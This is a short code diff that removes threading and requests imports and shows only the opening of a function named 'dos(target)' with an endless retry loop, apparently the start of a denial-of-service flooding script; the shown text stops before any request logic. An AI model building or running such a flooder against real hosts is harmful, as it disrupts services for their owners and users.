@@ -1,6 +1,3 @@
-import threading
-import requests
-
 def dos(target):
     while True:
         try:
